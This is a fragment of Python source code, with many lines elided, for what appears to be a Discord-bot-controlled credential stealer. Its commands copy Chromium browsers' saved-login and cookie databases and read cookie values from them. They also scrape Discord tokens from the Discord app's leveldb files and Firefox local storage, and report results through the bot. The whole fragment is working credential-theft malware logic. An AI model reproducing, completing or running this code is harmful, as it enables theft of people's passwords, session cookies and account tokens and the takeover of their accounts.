...
async def passwords(ctx):
    ...
    for browser_name, browser_path in chromium_browsers.items():
        try:
            ...
            temp_db = os.path.join(tempfile.gettempdir(), f"LoginData_{browser_name}.db")
...
async def cookies(ctx):
    ...
    for browser_name, browser_path in chromium_browsers.items():
        try:
            ...
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies LIMIT 100")
            ...
            for row in cursor.fetchall():
                ...
                if value:
                    ...
                    all_cookies.append(f"[{browser_name}]\nHost: {host}\nName: {name}\nValue: {display_value}\n{'─'*40}")
...
async def tokens(ctx):
    ...
    await ctx.send("🔍 Extracting Discord tokens from apps and browsers...")
    ...
    discord_paths = [
        os.path.join(roaming_appdata, "Discord"),
        os.path.join(roaming_appdata, "discordcanary"),
        os.path.join(roaming_appdata, "discordptb"),
        os.path.join(roaming_appdata, "DiscordDevelopment"),
    ]
    
    for discord_path in discord_paths:
        leveldb_paths = [
            os.path.join(discord_path, "Local Storage", "leveldb"),
            os.path.join(discord_path, "Local State"),
        ]
            ...
            if os.path.exists(leveldb_path):
                try:
                    if os.path.isdir(leveldb_path):
                        ...
                        try:
                            with open(leveldb_path, 'r', errors='ignore') as f:
                                content = f.read()
                                tokens = extract_discord_tokens_regex(content)
                                all_tokens.update(tokens)
                        except:
    ...
    try:
        firefox_path = os.path.join(roaming_appdata, "Mozilla", "Firefox", "Profiles")
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                profile_path = os.path.join(firefox_path, profile)
                ...
                if os.path.exists(local_storage_db):
                    try:
                        ...
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT value FROM webappsstore2 WHERE originKey LIKE '%discord%'")
                        
                        for row in cursor.fetchall():
                            if row[0]:
                                tokens = extract_discord_tokens_regex(row[0])
                                all_tokens.update(tokens)
